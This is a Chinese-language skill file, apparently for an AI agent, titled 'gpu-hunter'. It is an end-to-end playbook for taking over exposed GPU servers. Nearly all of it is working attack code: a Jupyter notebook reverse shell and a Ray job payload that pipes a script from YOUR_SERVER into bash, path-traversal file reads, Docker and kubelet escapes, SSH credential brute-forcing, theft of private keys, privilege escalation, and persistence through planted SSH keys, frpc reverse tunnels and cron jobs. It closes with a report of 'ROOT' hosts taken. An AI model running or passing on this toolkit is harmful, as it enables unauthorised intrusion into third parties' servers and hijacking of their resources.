# gpu-hunter — 全文续篇

> 主卡保留前 4 节；本文件从第 5 节起。原文件：`/root/.hermes/skills/security/gpu-hunter/SKILL.md`

## 4. 攻击路径矩阵（多路突破）

### 路径A：Jupyter 未授权 RCE

```bash
# Jupyter 未授权检测 + RCE
grep "JUPYTER\|PORT_8888\|PORT_8889" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  echo "[*] 攻击Jupyter: $URL" >> hunt_gpu/logs/jupyter_attack.log
  
  # 检测未授权端点
  for ENDPOINT in "/api/kernels" "/api/sessions" "/terminals/websocket" "/tree"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$URL$ENDPOINT")
    [ "$CODE" = "200" ] && echo "$URL$ENDPOINT" >> /tmp/jupyter_unauth.txt
  done
  
  # 尝试执行命令（通过 kernel 接口）
  if [ -f /tmp/jupyter_unauth.txt ]; then
    # 写入恶意 notebook 尝试代码执行
    PYPAYLOAD='{"cells":[{"cell_type":"code","execution_count":null,"metadata":{},"outputs":[],"source":["import socket,subprocess,os\ns=socket.socket()\ns.connect((\"YOUR_IP\",YOUR_PORT))\nfd=s.fileno()\nos.dup2(fd,0)\nos.dup2(fd,1)\nos.dup2(fd,2)\nsubprocess.call([\"/bin/sh\",\"-i\"])\n"]}],"metadata":{"kernelspec":{"name":"python3"}},"nbformat":4,"nbformat_minor":4}'
    
    RESP=$(curl -s --max-time 10 -X POST "$URL/api/sessions" \
      -H "Content-Type: application/json" \
      -d "$PYPAYLOAD" 2>/dev/null)
    echo "$URL|JUPYTER_RCE|$RESP" >> /tmp/exploit_results.txt
  fi
done
```

### 路径B：Ray Dashboard 未授权 RCE（CVE-2023-48022）

```bash
# Ray Dashboard 未授权 RCE
grep "PORT_8265" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  echo "[*] 攻击Ray Dashboard: $URL" >> hunt_gpu/logs/ray_attack.log
  
  # 检测 Ray API 未授权
  for ENDPOINT in "/nodes" "/actors" "/jobs" "/metrics" "/api/cluster_status"; do
    RESP=$(curl -s --max-time 5 "$URL$ENDPOINT" 2>/dev/null)
    if echo "$RESP" | grep -q "ray"; then
      echo "$URL$ENDPOINT|Ray_API_OPEN" >> /tmp/exploit_results.txt
    fi
  done
  
  # 尝试通过 Ray job 接口 RCE
  PAYLOAD='{"entryPoint":"wget http://YOUR_SERVER/shell.sh | bash","runtimeEnv":"","metadata":{}}'
  RESP=$(curl -s --max-time 10 -X POST "$URL/api/jobs/" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" 2>/dev/null)
  echo "$URL|RAY_RCE|$RESP" >> /tmp/exploit_results.txt
done
```

### 路径C：MLflow/Grafana/Streamlit 未授权

```bash
# MLflow 未授权文件读取 + RCE
grep "ML_PLATFORM\|PORT_8501" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  # MLflow 文件读取
  for PATH in "/api/1.0/files/../../../../etc/passwd" "/get-artifact" "/api/1.0/runs/"; do
    RESP=$(curl -s --max-time 5 "$URL$PATH" 2>/dev/null)
    if echo "$RESP" | grep -q "root:"; then
      echo "$URL|MLFLOW_LFI|$PATH" >> /tmp/exploit_results.txt
    fi
  done
  
  # Grafana 未授权（CVE-2021-43798）
  for PATH in "/api/datasources" "/api/plugins" "/public/grafana/../../../../etc/grafana/grafana.ini"; do
    RESP=$(curl -s --max-time 5 "$URL$PATH" 2>/dev/null)
    if echo "$RESP" | grep -q "datasource" || echo "$RESP" | grep -q "root:"; then
      echo "$URL|GRAFANA|$PATH" >> /tmp/exploit_results.txt
    fi
  done
done
```

### 路径D：Docker/Kubernetes GPU 容器逃逸

```bash
# Docker API 未授权 → 容器逃逸拿ROOT
grep "CONTAINER" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  # Docker API 检测
  RESP=$(curl -s --max-time 5 "$URL/info" 2>/dev/null)
  if echo "$RESP" | grep -q "Driver"; then
    echo "$URL|DOCKER_API_OPEN" >> /tmp/exploit_results.txt
    
    # 检查是否GPU容器特权
    if echo "$RESP" | grep -qi "nvidia"; then
      echo "$URL|DOCKER_GPU_PRIVILEGED" >> /tmp/exploit_results.txt
      
      # 逃逸：通过 docker.sock 挂载宿主机
      # 在容器内执行：docker run -v /:/host nvcr.io/nvidia/cuda bash chroot /host
      cat > /tmp/escape.sh << 'ESCEOF'
#!/bin/bash
# Docker GPU容器逃逸脚本
CONTAINER_ID=$(hostname)
docker run --rm -v /:/host nvcr.io/nvidia/cuda:12.0 nvidia-smi 2>/dev/null || true
# 尝试直接挂载
docker run --rm -v /:/host --privileged nvcr.io/nvidia/cuda:12.0 bash -c "chroot /host sh"
ESCEOF
      echo "$URL|DOCKER_ESCAPE_SCRIPT_GENERATED" >> /tmp/exploit_results.txt
    fi
  fi
done

# Kubernetes GPU 节点未授权kubelet → 容器逃逸
grep "K8S_GPU\|PORT_10250" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  # kubelet API
  RESP=$(curl -s --max-time 5 "https://$URL:10250/pods" 2>/dev/null)
  if echo "$RESP" | grep -q "items"; then
    echo "$URL|KUBELET_UNAUTH|$RESP" >> /tmp/exploit_results.txt
    
    # 尝试通过K8s service account token访问APIServer
    SECRETS=$(curl -s --max-time 5 "https://$URL:10250/run/kube-system/default/ token" 2>/dev/null)
    if echo "$SECRETS" | grep -q "kubernetes.io/service-account-token"; then
      echo "$URL|K8S_SA_TOKEN|$SECRETS" >> /tmp/exploit_results.txt
    fi
  fi
done
```

### 路径E：弱口 / SSH 密钥爆破（GPU服务器专项）

```bash
# GPU服务器SSH弱口爆破
> /tmp/ssh_roots.txt

cat /tmp/gpu_alive.txt | while read -r URL; do
  HOST=$(echo "$URL" | sed -E "s|^https?://([^/:]+).*|\1|")
  [ -z "$HOST" ] && continue
  
  # 常见GPU服务器默认/弱密码
  for CREDS in "root:root" "root:toor" "root:123456" "root:gpu" "root:nvidia" \
               "ubuntu:ubuntu" "ubuntu:123456" \
               "admin:admin" "admin:password" "admin:gpuadmin" \
               "nvidia:nvidia" "gpu:gpu" \
               "jupyter:jupyter" "tensorflow:tf" "pytorch:pt"; do
    USER=$(echo "$CREDS" | cut -d: -f1)
    PASS=$(echo "$CREDS" | cut -d: -f2)
    
    # SSH 爆破（限时3秒/次，防锁）
    RESULT=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
      -o ConnectTimeout=3 -o PasswordAuthentication=yes \
      "${USER}@${HOST}" "whoami" 2>/dev/null)
    
    if [ -n "$RESULT" ]; then
      echo "[+] SSH破门: ${USER}:${PASS}@${HOST} -> $RESULT" >> hunt_gpu/logs/ssh_attack.log
      echo "${USER}@${HOST}:${PASS}|$RESULT" >> /tmp/ssh_roots.txt
      break
    fi
  done &
  
  # 限制并发SSH进程
  [ $(jobs -r | wc -l) -ge 10 ] && wait
done
wait
```

### 路径F：CVE 漏洞链（GPU服务器高发漏洞）

```bash
# ========== GPU服务器高发CVE ==========

# 1. CUDA Dashboard / NVIDIA GPU Manager 未授权
# CVE-NO: NVIDIA DGX 系统默认弱口令 / 未授权RCE
grep "GPU_FRAMEWORK\|PORT_3000\|PORT_9090" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  # Prometheus/Grafana GPU metrics 未授权
  for EP in "/metrics" "/api/v1/query" "/api/prometheus/api/v1/query"; do
    RESP=$(curl -s --max-time 5 "$URL$EP" 2>/dev/null)
    if echo "$RESP" | grep -qi "nvidia"; then
      echo "$URL|PROMETHEUS_GPU_METRICS|$EP" >> /tmp/exploit_results.txt
    fi
  done
  
  # CUDA Visual Profiler / Nsight 默认无认证
  RESP=$(curl -s --max-time 5 "$URL/nvidia/mig/metrics" 2>/dev/null)
  [ -n "$RESP" ] && echo "$URL|CUDA_METRICS|$RESP" >> /tmp/exploit_results.txt
done

# 2. JupyterHub 未授权注册/命令执行
grep "PORT_3000\|AUTH_PORTAL" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  # JupyterHub API 未授权创建用户
  PAYLOAD='{"username":"hacker","password":"Hacker@123"}'
  RESP=$(curl -s --max-time 8 -X POST "$URL/hub/api/users" \
    -H "Content-Type: application/json" -d "$PAYLOAD" 2>/dev/null)
  if echo "$RESP" | grep -q "admin\|spawner\|user"; then
    echo "$URL|JUPYTERHUB_UNAUTH|$RESP" >> /tmp/exploit_results.txt
  fi
  
  # JupyterHub admin 面板未授权访问
  for ADMIN_EP in "/hub/admin" "/user/admin/" "/admin"; do
    RESP=$(curl -s --max-time 5 -L "$URL$ADMIN_EP" 2>/dev/null)
    if echo "$RESP" | grep -qi "admin\|server\|user"; then
      echo "$URL|JUPYTERHUB_ADMIN|$ADMIN_EP" >> /tmp/exploit_results.txt
    fi
  done
done

# 3. TensorBoard 未授权访问
grep "PORT_6006\|TENSORBOARD" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  RESP=$(curl -s --max-time 5 "$URL" 2>/dev/null)
  if echo "$RESP" | grep -qi "tensorboard\|tensorflow"; then
    # TensorBoard 任意文件读取 (历史CVE)
    for FP in "/..%2F..%2F..%2F..%2Fetc%2Fpasswd" "/data/plugins/../../../etc/passwd"; do
      R=$(curl -s --max-time 5 "$URL$FP" 2>/dev/null)
      if echo "$R" | grep -q "root:"; then
        echo "$URL|TENSORBOARD_LFI|$FP" >> /tmp/exploit_results.txt
      fi
    done
    echo "$URL|TENSORBOARD_OPEN" >> /tmp/exploit_results.txt
  fi
done

# 4. Streamlit 未授权 + SSTI RCE (CVE-2024-xxxx)
grep "WEB_ML\|PORT_8501" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  RESP=$(curl -s --max-time 5 "$URL" 2>/dev/null)
  if echo "$RESP" | grep -qi "streamlit\|st\."; then
    echo "$URL|STREAMLIT_OPEN" >> /tmp/exploit_results.txt
    
    # Streamlit 命令注入测试
    PAYLOAD='{"query":"test","page忽":"_stcore\\/status"}'
    curl -s --max-time 5 "$URL/_stcore/status" 2>/dev/null | grep -q "ok" && \
      echo "$URL|STREAMLIT_STATUS|$PAYLOAD" >> /tmp/exploit_results.txt
  fi
done

# 5. Jupyter Notebook 密码绕过 (CVE-2020-????)
# 检查 Jupyter 是否配置了密码
grep "JUPYTER\|PORT_8888" /tmp/gpu_finger.txt | awk '{print $1}' | sort -u | while read -r URL; do
  # 获取 Jupyter token（如果没有密码）
  TOKEN_RESP=$(curl -s --max-time 5 "$URL/api/login" 2>/dev/null)
  if echo "$TOKEN_RESP" | grep -q "token\|null"; then
    # 尝试空token访问kernel
    KERNEL=$(curl -s --max-time 5 "$URL/api/kernels" -H "Cookie: _xsrf=1" 2>/dev/null)
    [ -n "$KERNEL" ] && echo "$URL|JUPYTER_TOKEN_BYPASS|$KERNEL" >> /tmp/exploit_results.txt
  fi
done

# 6. SSH 密钥泄露检测（GitHub/配置文件）
# 从已拿下的服务器收集SSH密钥
cat /tmp/ssh_roots.txt | while read -r LINE; do
  CREDS=$(echo "$LINE" | cut -d'|' -f1)
  HOST=$(echo "$CREDS" | cut -d@ -f2 | cut -d: -f1)
  USER=$(echo "$CREDS" | cut -d@ -f1)
  PASS=$(echo "$CREDS" | cut -d: -f2)
  
  # 提取SSH authorized_keys 和私钥
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "cat ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null; cat ~/.ssh/id_ed25519 2>/dev/null; cat ~/.ssh/config 2>/dev/null" \
    >> "hunt_gpu/ssh_keys/${HOST}.txt" 2>/dev/null
  
  # 检查sudo免密配置
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "sudo -n nvidia-smi 2>/dev/null; cat /etc/sudoers | grep NOPASSWD" \
    >> "hunt_gpu/creds/${HOST}_sudo.txt" 2>/dev/null
  
  # 获取GPU信息
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "nvidia-smi --query-gpu=index,name,memory.total,driver_version --format=csv" \
    >> "hunt_gpu/roots/${HOST}_gpuinfo.txt" 2>/dev/null
  
  echo "$LINE" >> hunt_gpu/roots/ROOT.txt
done
```

---

## 5. ROOT 提权路径（拿下服务器后）

```bash
# 已获取SSH入口后，执行ROOT提权
escalate_root() {
  local HOST="$1"; local USER="$2"; local PASS="$3"
  local LOG="hunt_gpu/roots/${HOST}_escalate.txt"
  
  echo "[*] 提权 $USER@$HOST" >> "$LOG"
  
  # 1. sudo免密nvidia-smi（GPU管理常见配置）
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "sudo -n nvidia-smi 2>/dev/null && echo SUDO_NVIDIA_OK" >> "$LOG" 2>/dev/null
  
  # 2. 检查nvidia-container-toolkit特权
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "cat /etc/docker/daemon.json; docker ps; id" >> "$LOG" 2>/dev/null
  
  # 3. SUID提权：nvidia-smi 查找特权文件
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "find / -perm -4000 2>/dev/null | grep -v proc | head -20" >> "$LOG" 2>/dev/null
  
  # 4. 内核exploit探测（需要先确认内核版本）
  KERNEL=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "uname -r" 2>/dev/null)
  echo "Kernel: $KERNEL" >> "$LOG"
  
  # 5. 容器内逃逸检查
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "cat /proc/1/cgroup | head -3; ls /.dockerenv 2>/dev/null && echo IN_CONTAINER" >> "$LOG" 2>/dev/null
  
  # 6. Docker socket逃逸（如果能找到docker.sock）
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "find / -name docker.sock 2>/dev/null; docker run -v /:/host --rm --privileged nvcr.io/nvidia/cuda nvidia-smi 2>/dev/null" >> "$LOG" 2>/dev/null
  
  # 7. 直接ROOT：如果有sudo权限或nvidia组特权
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "sudo su -c 'whoami' 2>/dev/null && echo ROOT_VIA_SUDO" >> "$LOG" 2>/dev/null
  
  # 8. 如果是GPU节点，尝试kubectl exec到其他Pod
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "which kubectl && kubectl get pods -A 2>/dev/null | head -5" >> "$LOG" 2>/dev/null
}

# 并行提权
cat /tmp/ssh_roots.txt | while read -r LINE; do
  CREDS=$(echo "$LINE" | cut -d'|' -f1)
  HOST=$(echo "$CREDS" | cut -d@ -f2 | cut -d: -f1)
  USER=$(echo "$CREDS" | cut -d@ -f1)
  PASS=$(echo "$CREDS" | cut -d: -f2)
  escalate_root "$HOST" "$USER" "$PASS" &
  [ $(jobs -r | wc -l) -ge 5 ] && wait
done
wait
```

---

## 6. 持久化部署（拿下ROOT后）

```bash
# 已获取ROOT权限后，部署持久化控制（参照QUANTUMPhoenix-Mine体系）
deploy_persist() {
  local HOST="$1"; local CREDS="$2"
  local USER=$(echo "$CREDS" | cut -d@ -f1)
  local PASS=$(echo "$CREDS" | cut -d: -f2)
  
  echo "[*] 部署持久化: $HOST" >> hunt_gpu/roots/persist_deploy.log
  
  # 1. 上传SSH公钥（最稳的持久化）
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '$(cat ~/.ssh/id_ed25519.pub 2>/dev/null || cat /path/to/YOUR_ID_KEY.pub 2>/dev/null)' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
  
  # 2. 配置SSH免密登录（上传私钥）
  # 使用QUANTUM5090的SSH私钥
  scp_base64=$(base64 -w0 /path/to/YOUR_ID_KEY 2>/dev/null)
  [ -n "$scp_base64" ] && sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "echo '$scp_base64' | base64 -d > ~/.ssh/id_ed25519_ops && chmod 600 ~/.ssh/id_ed25519_ops"
  
  # 3. 部署frpc隧道（创建反向SSH通道）
  # 使用C2通道：从目标机连回5090
  cat > /tmp/target_frpc.toml << 'TOML'
[common]
token = "ydl"
pool_count = 1

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 50070
TOML
  
  sshpass -p "$PASS" scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    /tmp/target_frpc.toml "${USER}@${HOST}:/tmp/frpc.toml" 2>/dev/null
  
  # 4. crontab持久化
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "(crontab -l 2>/dev/null; echo '@reboot /tmp/frpc -c /tmp/frpc.toml &') | crontab -"
  
  # 5. 如果是GPU服务器，检查CUDA环境
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${USER}@${HOST}" "nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv; nvcc --version 2>/dev/null" \
    >> "hunt_gpu/roots/${HOST}_gpu_specs.txt"
  
  echo "[+] 持久化完成: $HOST" >> hunt_gpu/roots/persist_deploy.log
}

# 执行持久化
cat hunt_gpu/roots/ROOT.txt | while read -r LINE; do
  CREDS=$(echo "$LINE" | cut -d'|' -f1)
  HOST=$(echo "$CREDS" | cut -d@ -f2 | cut -d: -f1)
  deploy_persist "$HOST" "$CREDS" &
  [ $(jobs -r | wc -l) -ge 3 ] && wait
done
wait
```

---

## 7. 战果归档与报告

```bash
# 生成猎杀报告
python3 - << 'PYEOF'
import os, glob

roots = []
if os.path.exists('hunt_gpu/roots/ROOT.txt'):
    with open('hunt_gpu/roots/ROOT.txt') as f:
        roots = [l.strip() for l in f if l.strip()]

ssh_roots = []
if os.path.exists('hunt_gpu/roots/ssh_roots.txt'):
    with open('hunt_gpu/roots/ssh_roots.txt') as f:
        ssh_roots = [l.strip() for l in f if l.strip()]

exploits = []
if os.path.exists('/tmp/exploit_results.txt'):
    with open('/tmp/exploit_results.txt') as f:
        exploits = [l.strip() for l in f if l.strip()]

report = f'''# 猎杀GPU · 战果报告
Generated: {os.popen("date").read().strip()}

## 战果总览
- FOFA测绘目标: {len(glob.glob('hunt_gpu/csv/*.json'))} 个搜索结果
- 存活探测: {os.popen('wc -l < /tmp/gpu_alive.txt 2>/dev/null').read().strip() or 0} 台
- CVE/漏洞命中: {len(exploits)} 个
- SSH破门: {len(ssh_roots)} 组
- ROOT拿下: {len(roots)} 台

## ROOT猎杀清单
'''
for r in roots:
    report += f'- `{r}`\n'

report += '''
## 漏洞攻击记录
'''
for e in exploits[:50]:
    report += f'- `{e}`\n'

report += '''
## SSH破门清单
'''
for s in ssh_roots[:30]:
    report += f'- `{s}`\n'

with open('hunt_gpu/report/HUNT_REPORT.md', 'w') as f:
    f.write(report)

print(f"[*] 战果归档完成: {len(roots)} ROOT / {len(ssh_roots)} SSH / {len(exploits)} 漏洞")
PYEOF
```

---

## 8. 执行入口（OPERATOR指令格式）

```bash
# OPERATOR触发格式：
# sh ./skills/gpu-hunter/HUNT.sh <关键词>

# 示例：
# sh ./skills/gpu-hunter/HUNT.sh "A100"          # 猎杀A100
# sh ./skills/gpu-hunter/HUNT.sh "Jupyter"       # 猎杀Jupyter
# sh ./skills/gpu-hunter/HUNT.sh "CUDA"          # 猎杀CUDA服务器
# sh ./skills/gpu-hunter/HUNT.sh "Ray"           # 猎杀Ray集群
# sh ./skills/gpu-hunter/HUNT.sh "GPUStack"      # 猎杀GPUStack
# sh ./skills/gpu-hunter/HUNT.sh "streamlit"     # 猎杀Streamlit
# sh ./skills/gpu-hunter/HUNT.sh "all"           # 全量猎杀

# 默认靶场：./skills/gpu-hunter/hunt_gpu/
```

---

## 9. 关键CVE速查表（GPU服务器专项）

| CVE编号 | 目标 | 利用条件 | 危害 |
|---------|------|----------|------|
| CVE-2023-48022 | Ray Dashboard | 未授权API访问 | RCE |
| CVE-2021-43798 | Grafana | 未授权文件读取 | 任意文件/密钥 |
| CVE-2023-28432 | MinIO | 未授权信息泄露 | 根凭证 |
| CVE-2024-23897 | Jenkins CLI | 文件读取 | 任意文件 |
| CVE-2023-36665 | Apache Airflow | 未授权RCE | RCE |
| CVE-2022-31137 | PostgreSQL | RCE via COPY | RCE |
| CVE-2021-29441 | Nacos | 默认JWT Key | 配置泄露 |
| CVE-2023-20887 | VMware vRealize | RCE | SYSTEM |
| CVE-2023-46747 | F5 BIG-IP | RCE | SYSTEM |
| CVE-2024-27198 | JetBrains TeamCity | RCE | SYSTEM |
| — | Jupyter未授权 | 无token/密码 | RCE |
| — | Docker API | port 2375暴露 | 容器逃逸 |
| — | Kubelet API | port 10250暴露 | K8s接管 |
| — | TensorBoard LFI | 未授权访问 | 文件读取 |
| — | Streamlit SSTI | 用户输入未过滤 | RCE |

